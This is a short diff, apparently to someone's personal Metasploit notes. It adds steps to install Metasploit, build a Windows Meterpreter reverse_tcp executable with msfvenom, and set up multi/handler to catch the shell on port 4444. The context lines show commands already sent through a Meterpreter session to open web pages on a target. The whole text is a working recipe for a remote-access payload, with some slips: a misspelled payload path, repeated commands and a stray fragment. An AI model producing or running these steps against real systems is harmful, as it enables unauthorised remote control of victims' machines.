@@ -238,4 +238,24 @@ start https://www.google.com
 start https://www.youtube.com/results?search_query=hai+apna+dil+toh+aawara
 
 # Return to Meterpreter
-exit
+exit 
+
+# reloaded
+sudo apt install metasploit-framework
+sudo msfdb init
+msfconsole
+db_status
+search platform:windows
+
+msfvenom --payload windows/meterpreter/reverse_tcp \ --arch x86 --format exe \ 
+LHOST=192.168.38.134 LPORT=4444 > windowsMterpreter.exe
+
+msfconsole
+use multi/handler
+set payload window/meterpreter/reverse_tcp
+msfconsole
+use exploit/multi/handler
+er/reverse_tcp
+set LHOST 10.0.2.15
+set LPORT 4444
+show options
